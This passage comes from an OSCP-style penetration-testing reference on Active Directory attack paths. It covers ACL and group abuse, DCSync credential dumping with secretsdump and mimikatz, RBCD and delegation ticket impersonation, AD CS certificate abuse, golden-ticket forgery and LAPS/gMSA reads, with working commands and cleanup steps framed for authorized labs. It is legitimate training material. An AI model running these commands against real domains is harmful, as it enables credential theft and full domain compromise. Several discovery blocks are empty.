Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs
```

**Interpret:** A membership-write operation can grant a defined group capability once new logon/token state reflects it.

**Still check:** Verify effective right, actual group-derived authorization, nesting/token refresh and restoration.

**Verify:** Verify directory membership and actual service action from a refreshed context, then restore the original membership.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-group-control)

### Full procedure and variants

```powershell
Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose
Get-DomainGroupMember -Identity TARGET_GROUP |
  Where-Object { $_.MemberName -eq 'CONTROLLED_USER' }

# Built-in alternative
net group TARGET_GROUP CONTROLLED_USER /add /domain
```

A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective:

```powershell
Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false
net group TARGET_GROUP CONTROLLED_USER /delete /domain
```

### Follow the evidence

- [ Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm) — A WinRM listener and a candidate endpoint-authorized account Required: Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context
- [ Validate host access and volatile session candidates](ad-mapping.md#domain-hosts) — Group-to-host access edges or a privileged user's possible session Required: Reachable destination service and its actual authorization; session evidence must be current and collection rights sufficient
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
## ad-owner-dacl

### Convert ownership or DACL control into a narrower useful right

**Enter:** Effective WriteOwner or WriteDacl on a useful directory object

**Discovery**

```text
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
```

**Interpret:** Ownership/DACL control may enable a narrower useful ACE; it is an intermediate capability.

**Still check:** Validate actual owner semantics, deny/protected-object behavior, ability to grant the next right and original-state restoration.

**Verify:** Verify the intermediate owner/DACL state and final operation separately; restore original state afterward.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-owner-dacl)

### Full procedure and variants

`WriteOwner` can make the controlled identity the owner; ownership may then permit a DACL change. `WriteDacl` can grant only the narrower right needed for the intended transition.

```powershell
Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose

# Group-membership variant
Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose

# Remove the ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
```

Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.

### Follow the evidence

- [ Reset a target account password through a validated directory right](ad-identities.md#ad-password-reset) — A controlled trustee has the effective password-reset right on a useful account Required: Exact object/right and account state; the disruptive password change is justified within the assigned lab objective
- [ Add a controlled identity to a group through effective membership rights](ad-identities.md#ad-group-control) — A group member-attribute write or equivalent effective right Required: Exact target group, controlled principal, useful resulting right and a fresh token/logon context
- [ Create a temporary SPN through an effective object right](ad-identities.md#ad-targeted-roast) — A controlled principal can write a user's servicePrincipalName Required: Effective SPN-property right, compatible account, unique temporary SPN, authenticated TGS request and exact cleanup
## ad-dcsync

### Use validated directory replication rights for bounded credential proof

**Enter:** A principal has the relevant effective replication rights at the domain naming context

**Discovery**

```text
Get-DomainObjectAcl -Identity DOMAIN_DN -ResolveGUIDs
```

**Interpret:** Replication rights at the domain scope are the relevant clue; local administrator rights on a member host are different.

**Still check:** Verify the complete effective replication rights for selected data, trustee membership, DC/RPC route and identity context.

**Verify:** Verify the replication source, account and material type; avoid equating a tool label with proven rights.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-dcsync)

### Full procedure and variants

> **Prerequisite:** effective domain-root rights equivalent to `Replicating Directory Changes` plus `Replicating Directory Changes All` (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient.

Validate ACLs at the domain root:

```powershell
Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
```

A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose

# Remove the delegated replication ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
```

Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change.

Request one approved test account rather than dumping the directory:

```bash
impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \
  'DOMAIN/USER:PASSWORD@DC_HOST'
```

Mimikatz equivalent from an authorized Windows context:

```text
lsadump::dcsync /domain:DOMAIN /user:TARGET_USER
```

> **Decisive output:** selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.

### Follow the evidence

- [ Recover or reuse an NT password hash](credentials.md#nt-hash) — An NT verifier from an appropriate credential source Required: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
- [ Capture state-transition, proof and exploit-adaptation evidence](integration.md#attack-evidence) — Access, privilege, identity or route changes, or a report will need reproduction Required: Known destination/identity, observable effect and a private evidence destination; actual exam proof requirements must be read from current official guidance
## ad-gpo

### Conditional: trace GPO control to privileged policy consumption

**Enter:** A useful linked GPO has a potentially controllable directory or SYSVOL component

**Discovery**

```text
Get-DomainGPO
Get-DomainOU | Select-Object name,gplink
```

**Interpret:** A linked policy supplies a potential privileged consumer only for hosts to which it actually applies.

**Still check:** Check both needed policy components, effective ACEs, security/WMI filtering, target scope and refresh trigger.

**Verify:** Verify actual policy application and resulting privileged effect; retain/restorable original policy state.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-gpo)

### Full procedure and variants

Identify GPOs and links:

```powershell
Get-DomainGPO
Get-DomainOU | Select-Object name,distinguishedname,gplink
Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
```

For a candidate, prove:

1. the controlled principal can edit both the directory object and relevant SYSVOL policy files;
2. the GPO is linked to the OU containing the intended test host/user;
3. security filtering and WMI filters include that subject;
4. the configured preference/task/script runs in the expected context; and
5. policy refresh or another predictable trigger will occur.

SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action:

```cmd
SharpGPOAbuse.exe --help
gpresult /r
gpupdate /force
```

Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.

### Follow the evidence

- [ Validate effective directory-object control](ad-mapping.md#domain-acl) — An ACL/graph edge names GenericAll, GenericWrite, WriteDacl, WriteOwner or an extended/property right Required: Effective trustee membership, target object/type, inheritance/deny behavior and the exact permitted operation
- [ Control scheduled tasks, startup files or autostart consumers](windows-privesc.md#windows-tasks) — A task/startup action consumes a writable command, file, directory or registry value Required: Effective object control, a higher principal and a usable scheduled/logon/manual trigger
- [ Maintain state and select the next evidence-producing test](integration.md#attack-state) — Several hosts, identities, routes or competing hypotheses need coordination Required: Explicit scope/objective and a record of observations, unknowns and available capabilities
## ad-delegation

### Conditional: use a validated delegation or RBCD relationship

**Enter:** Delegation configuration or computer-object write suggests a Kerberos impersonation path

**Discovery**

```text
Get-DomainComputer -TrustedToAuth
Get-DomainComputer -Unconstrained
```

**Interpret:** A delegation flag opens a configuration investigation; unconstrained, constrained and RBCD require different relationships.

**Still check:** Identify exact delegation type, controlled service/machine key, target SPN, relevant account flags and KDC acceptance.

**Verify:** Verify the exact service ticket and successful destination action, with original delegation state preserved.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-delegation)

### Full procedure and variants

Enumerate before attempting any ticket operation:

```powershell
Get-DomainComputer -Unconstrained | Select-Object dnshostname
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
```

```bash
impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
```

Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN:

```bash
impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD'
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
```

Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material.

##### Resource-based constrained delegation

> **Prerequisite:** effective write control over the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` plus control of a principal with an SPN (often a lab computer account).

```bash
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP

impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'

impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD'
```

Cleanup after the lab objective:

```bash
impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -delete -dc-ip DC_IP
```

Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.

### Follow the evidence

- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Validate effective directory-object control](ad-mapping.md#domain-acl) — An ACL/graph edge names GenericAll, GenericWrite, WriteDacl, WriteOwner or an extended/property right Required: Effective trustee membership, target object/type, inheritance/deny behavior and the exact permitted operation
## ad-certificates

### Conditional: validate an AD CS enrollment-to-authentication path

**Enter:** A CA/template configuration exposes a plausible certificate identity transition

**Discovery**

```text
certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled
```

**Interpret:** The conjunction of purpose, subject control and effective enrollment rights is a candidate; issuance and identity mapping are separate gates.

**Still check:** Check exact template/CA rights/settings, approval/signatures, required key, current mapping and authenticatable identity.

**Verify:** Verify issuance, matching private key, mapped account and a successful authentication effect; preserve and restore template changes.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-certificates)

### Full procedure and variants

> **Prerequisite:** reachable CA/DC and a valid domain identity. **Decisive output:** a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.

Package names vary:

```bash
command -v certipy-ad || command -v certipy
certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -enabled -vulnerable -stdout
```

Review:

- CA name and host;
- template name and whether it is enabled/published;
- who can enroll;
- client-authentication EKUs/purpose;
- subject/SAN supply controls;
- manager approval/signature requirements;
- template owner and modification rights;
- web enrollment/relay-related configuration where relevant.

An `ESC` label is a candidate classification. Manually validate the properties and the controlled identity's effective rights.

Generic request after validating a specific template:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE
```

An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE \
  -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID'
```

```bash
certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication.

Before any authorized template change, save configuration:

```bash
certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -template TEMPLATE -save-configuration template-backup.json
```

Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect `certipy-ad template -h` for the installed version, and restore the saved configuration after the demonstration.

### Follow the evidence

- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
- [ Validate effective directory-object control](ad-mapping.md#domain-acl) — An ACL/graph edge names GenericAll, GenericWrite, WriteDacl, WriteOwner or an extended/property right Required: Effective trustee membership, target object/type, inheritance/deny behavior and the exact permitted operation
## kerberos-golden

### Conditional: understand a realm-wide TGT forgery from KRBTGT material

**Enter:** An already compromised domain exposes a KRBTGT key and domain SID

**Discovery**

```text
klist
whoami /user
```

**Interpret:** KRBTGT key exposure is the enabling post-compromise condition; an ordinary NT hash or unrelated ticket cannot substitute.

**Still check:** Verify current cryptographic material/version, realm/SID/principal, time and actual service validation; retain recovery/cleanup scope.

**Verify:** Verify cryptographic source, represented principal and exact service effect; protect the key and remove generated test credentials.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#kerberos-golden)

### Full procedure and variants

Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use [Silver tickets](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md#8-silver-tickets-forge-one-service-ticket).

Authorized isolated-lab examples:

```bash
# Golden: realm-wide TGT material
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN AUTHORIZED_TEST_USER

export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
klist
```

Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.

### Follow the evidence

- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Capture state-transition, proof and exploit-adaptation evidence](integration.md#attack-evidence) — Access, privilege, identity or route changes, or a report will need reproduction Required: Known destination/identity, observable effect and a private evidence destination; actual exam proof requirements must be read from current official guidance
## S02

### Read a classic LAPS password for one computer

**Enter:** a specific computer object is relevant and the current directory principal may read ms-Mcs-AdmPwd.

**Discovery**

```text

```

**Interpret:** identify the computer object and test the attribute read; merely enumerating the object is not enough.

**Still check:** the returned value is present, current and scoped to that computer's managed local account; identify the intended local username and destination service separately.

**Verify:** validate the password on one compatible service using explicit local-account context, then prove the specific permitted operation. Password acceptance does not prove local administration or remote execution.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#delegated-reads--laps-and-gmsa-material)

### Full procedure and variants

- **Enter:** a specific computer object is relevant and the current directory principal may read `ms-Mcs-AdmPwd`.
- **Discover:** identify the computer object and test the attribute read; merely enumerating the object is not enough.
- **Validate:** the returned value is present, current and scoped to that computer's managed local account; identify the intended local username and destination service separately.
- **Execute:** [Delegated LAPS/gMSA reads](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#delegated-reads--laps-and-gmsa-material).
- **Verify:** validate the password on one compatible service using explicit local-account context, then prove the specific permitted operation. Password acceptance does not prove local administration or remote execution.
- **Outcomes:** readable current value → D17/D29; attribute denied/absent for this principal/object → ruled out here; schema, replication freshness or object identity unresolved → inconclusive.

### Follow the evidence

## S03

### Read or decrypt a Windows LAPS password

**Enter:** a relevant computer uses Windows LAPS and the principal may read msLAPS-Password or decrypt the protected value.

**Discovery**

```text

```

**Interpret:** query the exact computer attribute and record whether the result is plaintext JSON, encrypted content, empty or denied.

**Still check:** plaintext/decryption rights, password age, managed account name and host scope. An encrypted blob without the permitted decryption context is not a password.

**Verify:** validate only against the named host and intended local account, then establish the actual service capability.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#delegated-reads--laps-and-gmsa-material)

### Full procedure and variants

- **Enter:** a relevant computer uses Windows LAPS and the principal may read `msLAPS-Password` or decrypt the protected value.
- **Discover:** query the exact computer attribute and record whether the result is plaintext JSON, encrypted content, empty or denied.
- **Validate:** plaintext/decryption rights, password age, managed account name and host scope. An encrypted blob without the permitted decryption context is not a password.
- **Execute:** [Delegated LAPS/gMSA reads](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#delegated-reads--laps-and-gmsa-material).
- **Verify:** validate only against the named host and intended local account, then establish the actual service capability.
- **Outcomes:** usable current password → D17/D29; no read/decrypt right → ruled out here; returned protected data but decryption context unknown → inconclusive.

### Follow the evidence

## S04

### Recover and classify gMSA material

**Enter:** a specific gMSA is used by a relevant service and the current identity may read msDS-ManagedPassword.

**Discovery**

```text

```

**Interpret:** inspect the gMSA object and allowed managed-password readers; distinguish a raw blob from a decoded NT hash.

**Still check:** exact account name including $, managed-password read permission, working LDAPS/tool path, decoded representation and intended service/host.

**Verify:** test one service compatible with the decoded material and record the exact accepted identity and operation. Authentication is not administrative execution.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights)

### Full procedure and variants

- **Enter:** a specific gMSA is used by a relevant service and the current identity may read `msDS-ManagedPassword`.
- **Discover:** inspect the gMSA object and allowed managed-password readers; distinguish a raw blob from a decoded NT hash.
- **Validate:** exact account name including `$`, managed-password read permission, working LDAPS/tool path, decoded representation and intended service/host.
- **Execute:** [Raw and decoded gMSA checks](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights).
- **Verify:** test one service compatible with the decoded material and record the exact accepted identity and operation. Authentication is not administrative execution.
- **Outcomes:** decoded material accepted for the intended identity → D17/D29; read denied or wrong object type → ruled out here; raw blob, TLS failure or empty output → inconclusive.

### Follow the evidence

## S05

### Use a validated shadow-credential path

**Enter:** the effective principal can write the target object's msDS-KeyCredentialLink, and the assigned lab permits the object change.

**Discovery**

```text

```

**Interpret:** list existing key credentials before mutation and preserve their identifiers.

**Still check:** target identity, exact effective write right, DC PKINIT/key-trust support, DNS/time/KDC route, certificate tooling and a cleanup route.

**Verify:** establish the cached target principal and one intended service action; then confirm that only the newly added key credential was removed.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#shadow-credentials--object-key-write-pkinit-then-cleanup)

### Full procedure and variants

- **Enter:** the effective principal can write the target object's `msDS-KeyCredentialLink`, and the assigned lab permits the object change.
- **Discover:** list existing key credentials before mutation and preserve their identifiers.
- **Validate:** target identity, exact effective write right, DC PKINIT/key-trust support, DNS/time/KDC route, certificate tooling and a cleanup route.
- **Execute:** [Shadow credentials — add, authenticate and remove only the added DeviceID](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#shadow-credentials--object-key-write-pkinit-then-cleanup).
- **Verify:** establish the cached target principal and one intended service action; then confirm that only the newly added key credential was removed.
- **Outcomes:** target TGT/service capability established → D28/D29; effective write or PKINIT prerequisite disproved → ruled out here; write succeeds but certificate/KDC mapping is unresolved → D31/inconclusive.

### Follow the evidence

## S06

### Authenticate to LDAP with a mapped certificate

**Enter:** you possess a certificate and private key plausibly mapped to an AD identity, and LDAP over TLS is reachable.

**Discovery**

```text

```

**Interpret:** identify certificate subject/SAN/EKU, trust chain, private-key availability and the DC TLS path.

**Still check:** the certificate maps to the intended principal, the private key matches, Schannel authentication is accepted and the mapped identity has the exact object right required by the intended LDAP operation.

**Verify:** whoami/bind establishes only the mapped LDAP identity; separately verify the selected LDAP read or write and its object state.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#passthecert--schannelldap-when-the-certificate-is-usable-there)

### Full procedure and variants

- **Enter:** you possess a certificate and private key plausibly mapped to an AD identity, and LDAP over TLS is reachable.
- **Discover:** identify certificate subject/SAN/EKU, trust chain, private-key availability and the DC TLS path.
- **Validate:** the certificate maps to the intended principal, the private key matches, Schannel authentication is accepted and the mapped identity has the exact object right required by the intended LDAP operation.
- **Execute:** [PassTheCert identity check and LDAP shell](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#passthecert--schannelldap-when-the-certificate-is-usable-there).
- **Verify:** `whoami`/bind establishes only the mapped LDAP identity; separately verify the selected LDAP read or write and its object state.
- **Outcomes:** mapped identity and permitted object operation confirmed → D26; mapping/trust/private key disproved → ruled out here; PKINIT fails while Schannel remains untested, or TLS errors mask mapping → inconclusive.

### Follow the evidence

## S07

### Create a controlled machine account only for a selected AD path

**Enter:** a validated RBCD/delegation path needs a service principal or machine key you control.

**Discovery**

```text

```

**Interpret:** inspect machine-account quota, target OU/container ACL, existing names and whether the current identity can create the account in the intended location.

**Still check:** the downstream path actually needs this principal, the resulting SPNs/key will be usable, target-object rights are independently present, and cleanup/deletion rights are understood.

**Verify:** confirm the created object, its SPNs and controlled key; do not record RBCD or target access until the separate delegation operation and service ticket succeed.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#powermad--create-an-account-only-when-the-chosen-ad-path-needs-it)

### Full procedure and variants

- **Enter:** a validated RBCD/delegation path needs a service principal or machine key you control.
- **Discover:** inspect machine-account quota, target OU/container ACL, existing names and whether the current identity can create the account in the intended location.
- **Validate:** the downstream path actually needs this principal, the resulting SPNs/key will be usable, target-object rights are independently present, and cleanup/deletion rights are understood.
- **Execute:** [Powermad machine-account creation](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#powermad--create-an-account-only-when-the-chosen-ad-path-needs-it).
- **Verify:** confirm the created object, its SPNs and controlled key; do not record RBCD or target access until the separate delegation operation and service ticket succeed.
- **Outcomes:** controlled principal created for an already validated receiver path → D27; quota/ACL/name condition fails → ruled out here; object exists but downstream target right is missing → retain only the machine-account capability.

### Follow the evidence

## S08

### Evaluate DNSAdmins without assuming immediate execution

**Enter:** the controlled principal is a direct/effective DNSAdmins member or has equivalent DNS-server configuration rights.

**Discovery**

```text

```

**Interpret:** identify the actual DNS server, DNS service state/identity and service ACL from the current authorized source.

**Still check:** effective configuration permission, product/build behavior, a usable plugin/configuration operation, payload delivery path and a separately authorized restart trigger. A restart on a DC is disruptive and is never a discovery probe.
ACTION PROCEDURE PENDING: discovery/validation only.

**Verify:** current content supports only membership/service/trigger investigation. A complete plugin execution and cleanup procedure is not registered; see RW01.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/#dnsadmins-distinguish-dns-configuration-from-a-service-trigger)

### Full procedure and variants

- **Enter:** the controlled principal is a direct/effective DNSAdmins member or has equivalent DNS-server configuration rights.
- **Discover:** identify the actual DNS server, DNS service state/identity and service ACL from the current authorized source.
- **Validate:** effective configuration permission, product/build behavior, a usable plugin/configuration operation, payload delivery path and a separately authorized restart trigger. A restart on a DC is disruptive and is never a discovery probe.
- **Execute:** [DNSAdmins condition checks](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/#dnsadmins-distinguish-dns-configuration-from-a-service-trigger).
- **Verify:** current content supports only membership/service/trigger investigation. A complete plugin execution and cleanup procedure is not registered; see RW01.
- **Outcomes:** all prerequisites identified → ready for a separately reviewed procedure; membership absent/effective right denied → ruled out here; group present but configuration or trigger unknown → inconclusive.

### Follow the evidence

## S09

### Map WSUS client policy to a server-side authorization question

**Enter:** host policy or traffic indicates the machine uses WSUS.

**Discovery**

```text

```

**Interpret:** read WUServer, WUStatusServer and UseWUServer; record URL, port, TLS and actual source reachability.

**Still check:** authenticated access to the identified server, update-approval/content/signing/deployment rights, target group scope and the privileged client consumer. Client configuration alone supplies none of those rights.
ACTION PROCEDURE PENDING: discovery/validation only.

**Verify:** this state produces a named update authority and a missing-rights checklist, not code execution. A complete update-deployment procedure is not registered; see RW02.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/#wsus-identify-the-update-authority-from-the-current-client)

### Full procedure and variants

- **Enter:** host policy or traffic indicates the machine uses WSUS.
- **Discover:** read `WUServer`, `WUStatusServer` and `UseWUServer`; record URL, port, TLS and actual source reachability.
- **Validate:** authenticated access to the identified server, update-approval/content/signing/deployment rights, target group scope and the privileged client consumer. Client configuration alone supplies none of those rights.
- **Execute:** [WSUS client authority discovery](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/#wsus-identify-the-update-authority-from-the-current-client).
- **Verify:** this state produces a named update authority and a missing-rights checklist, not code execution. A complete update-deployment procedure is not registered; see RW02.
- **Outcomes:** authority plus exact server-side control established → ready for a separately reviewed procedure; server rights denied → ruled out here; registry values absent or server role unknown → inconclusive.

### Follow the evidence

## S10

### Recognize SCCM client context and locate the management boundary

**Enter:** CcmExec, SMS_Client or readable client configuration indicates Configuration Manager.

**Discovery**

```text

```

**Interpret:** identify client state, assigned site, management point and reachable authenticated interfaces.

**Still check:** SMS Provider/site-server authorization, deployment or CMPivot rights, relevant collection scope and any specifically readable credential source. Client presence does not imply server rights.
ACTION PROCEDURE PENDING: discovery/validation only.

**Verify:** this state establishes product/site context only. A complete SCCM rights-to-action procedure is not registered; see RW03.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/#configuration-manager--sccm-recognize-the-client-before-choosing-a-server-side-path)

### Full procedure and variants

- **Enter:** `CcmExec`, `SMS_Client` or readable client configuration indicates Configuration Manager.
- **Discover:** identify client state, assigned site, management point and reachable authenticated interfaces.
- **Validate:** SMS Provider/site-server authorization, deployment or CMPivot rights, relevant collection scope and any specifically readable credential source. Client presence does not imply server rights.
- **Execute:** [SCCM client recognition checks](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/#configuration-manager--sccm-recognize-the-client-before-choosing-a-server-side-path).
- **Verify:** this state establishes product/site context only. A complete SCCM rights-to-action procedure is not registered; see RW03.
- **Outcomes:** exact management interface and relevant permission found → ready for a separately reviewed procedure; no applicable server permission → ruled out here; namespace access denied or site/role unresolved → inconclusive.

### Follow the evidence

## S16

### Inspect VSS/shadow-copy credential-source conditions

**Enter:** you control a Windows Server/DC context where offline credential material is relevant and the token may hold administrative or backup rights.

**Discovery**

```text

```

**Interpret:** inspect whoami /priv, vssadmin list shadows, then diskshadow → list shadows all.

**Still check:** establish platform, exact volume, existing-versus-new snapshot, read rights, matched NTDS.dit and SYSTEM-hive requirement, output destination and cleanup authority.
ACTION PROCEDURE PENDING: discovery/validation only.

**Verify:** listing proves only snapshot metadata. Credential acquisition requires readable, point-in-time-compatible NTDS/SYSTEM material and successful offline parsing.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/02-credential-access/#shadow-copy-boundary-inspect-before-creating-anything)

### Full procedure and variants

- **Enter:** you control a Windows Server/DC context where offline credential material is relevant and the token may hold administrative or backup rights.
- **Discover:** inspect `whoami /priv`, `vssadmin list shadows`, then `diskshadow` → `list shadows all`.
